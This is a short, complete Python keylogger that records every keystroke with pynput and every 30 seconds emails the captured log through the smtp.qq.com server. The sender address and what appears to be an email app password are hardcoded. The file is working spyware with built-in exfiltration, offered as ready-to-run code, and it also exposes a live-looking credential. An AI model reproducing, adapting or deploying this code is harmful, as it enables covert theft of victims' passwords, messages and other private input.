import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.header import Header

class Keylogger:
    def __init__(self, email, password, time_interval=120):
        self.log = "keylogger start"
        self.interval = time_interval
        self.fromwho = "1533724109@qq.com"
        self.email = email
        self.password = password

    def combine_info(self,subject,fromwho,towho,message):
        msg = MIMEText(message, "plain", "utf-8")
        msg["Subject"] = Header(subject, "utf-8")
        msg["from"] = fromwho
        msg["to"] = towho
        return msg


    def append_current_key(self, key):
        self.log += key

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = (" [" + str(key).split('.')[-1]+ "] ")
        self.append_current_key(current_key)
    def send_email(self, email, towho, password, message):
         server = smtplib.SMTP("smtp.qq.com")
         server.starttls()
         server.login(email, password)
         server.sendmail(email, towho, message)
         server.quit()
 
    def report(self):
        if self.log:
            message = self.combine_info("keylogger",self.fromwho,self.email,self.log)
            self.send_email(self.fromwho,self.email,self.password,message.as_string())
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
if __name__ == "__main__":
    keylogger = Keylogger("1533724109@qq.com", "kaemtvxmktzljcdg", 30)
    keylogger.start()
